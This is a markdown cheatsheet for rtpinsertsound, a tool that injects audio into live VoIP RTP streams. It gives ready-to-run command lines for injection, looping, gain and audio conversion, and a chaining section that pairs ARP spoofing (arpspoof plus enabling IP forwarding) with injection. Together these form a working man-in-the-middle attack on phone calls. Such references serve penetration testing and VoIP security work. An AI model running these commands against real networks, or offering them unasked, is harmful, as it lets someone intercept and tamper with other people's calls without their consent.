---
title: "rtpinsertsound Cheatsheet"
description: Quick reference for rtpinsertsound audio injection tool
tool: rtpinsertsound
category: voip
difficulty: advanced
---

# rtpinsertsound Cheatsheet

## Quick Start

```bash
# Basic injection
sudo rtpinsertsound -i eth0 -f audio.wav -r 10000 -s 192.168.1.100 -d 192.168.1.200

# Loop mode
sudo rtpinsertsound -i eth0 -f audio.wav -r 10000 -l -s 192.168.1.100 -d 192.168.1.200

# With gain
sudo rtpinsertsound -i eth0 -f audio.wav -r 10000 -g 10 -s 192.168.1.100 -d 192.168.1.200
```

## Common Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-i` | Interface | `-i eth0` |
| `-f` | Audio file | `-f injection.wav` |
| `-r` | RTP port | `-r 10000` |
| `-s` | Source IP | `-s 192.168.1.100` |
| `-d` | Destination IP | `-d 192.168.1.200` |
| `-p` | Payload type | `-p 0` |
| `-v` | Verbose | `-v` |
| `-l` | Loop audio | `-l` |
| `-g` | Gain (dB) | `-g 10` |

## Examples

### Basic Injection
```bash
sudo rtpinsertsound -i eth0 -f alert.wav -r 10000 -s 192.168.1.100 -d 192.168.1.200
```

### Loop with Gain
```bash
sudo rtpinsertsound -i eth0 -f loop.wav -r 10000 -l -g 5 -s 192.168.1.100 -d 192.168.1.200
```

### Convert Audio First
```bash
sox input.wav -r 8000 -c 1 -e a-law injection.raw
sudo rtpinsertsound -i eth0 -f injection.raw -r 10000 -s 192.168.1.100 -d 192.168.1.200
```

## Chaining

```bash
# Detect streams then inject
sudo rtpbreak -i capture.pcap -a -v
# Note the RTP port from output
sudo rtpinsertsound -i eth0 -f audio.wav -r <port> -s 192.168.1.100 -d 192.168.1.200

# ARP spoof + inject
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.200 &
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo rtpinsertsound -i eth0 -f audio.wav -r 10000 -s 192.168.1.100 -d 192.168.1.200
```

## Troubleshooting

| Problem | Fix |
|---------|-----|
| No injection | Detect streams with rtpbreak first |
| Garbled audio | Match payload type with `-p` |
| Permission denied | Run with `sudo` |
| Wrong format | Convert with `sox` |

```bash
# Check audio format
file audio.wav
soxi audio.wav

# Verify RTP port
sudo tcpdump -i eth0 "udp and portrange 10000-20000" -n -c 10
```
